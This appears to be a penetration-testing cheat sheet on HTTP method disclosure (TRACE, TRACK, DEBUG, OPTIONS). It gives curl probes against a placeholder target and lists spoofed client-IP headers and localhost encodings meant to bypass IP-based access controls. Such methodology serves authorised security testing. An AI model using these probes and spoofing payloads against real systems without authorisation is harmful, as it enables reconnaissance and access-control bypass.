# HTTP Method Disclosure (TRACE / TRACK / OPTIONS / DEBUG)

## When this applies

- Server allows TRACE / TRACK / DEBUG methods that echo headers back.
- IIS exposes TRACK.
- OPTIONS reveals additional supported methods (PUT, DELETE) you missed in main reconnaissance.

## Technique

Probe with TRACE, TRACK, DEBUG, OPTIONS, HEAD. TRACE/TRACK echo all request headers in the body — useful for capturing internal headers added by upstream proxies.

## Steps

```
□ Test TRACE method
□ Test TRACK method (IIS)
□ Use OPTIONS to list methods
□ Test HEAD vs GET differences
□ Try DEBUG method
```

**Quick Exploit:**
```http
TRACE / HTTP/1.1
Host: target.com

# Or using curl
curl -X TRACE https://target.com/admin -v
```

**Look for custom headers:**
```
X-Forwarded-For
X-Real-IP
X-Client-IP
X-Custom-IP-Authorization
X-Originating-IP
CF-Connecting-IP
True-Client-IP
```

### IP spoofing headers — useful when TRACE reveals proxies

**Common Headers to Test:**
```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Host: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

**Localhost variations:**
```
127.0.0.1
localhost
::1
0.0.0.0
127.1
0x7f.0x0.0x0.0x1
2130706433
```

**Private IP ranges:**
```
10.0.0.1
172.16.0.1
192.168.1.1
192.168.0.1
```

### TRACE one-liner

```bash
# Test TRACE
curl -X TRACE https://target.com -v 2>&1 | grep -i "x-"
```

## Verifying success

- TRACE returns the request body containing all headers — including any added by upstream proxies (proxy hostnames, internal IPs, X-Forwarded-* chains).
- OPTIONS returns `Allow:` header listing PUT/DELETE/PATCH support that wasn't visible elsewhere.
- DEBUG returns a debug response on IIS / certain frameworks.

## Common pitfalls

- TRACE is mostly disabled in modern Apache/nginx; IIS more often allows TRACK.
- Cloudflare/cloud WAFs may block TRACE at the edge — test from a direct origin if you find one.
- HEAD often serves smaller responses but may bypass content-type sniffing — useful for confirming hidden file existence.

## Tools

- curl `-X TRACE / TRACK / DEBUG / OPTIONS`
- httpie
- nikto (auto-tests TRACE)
- nmap `--script http-trace`
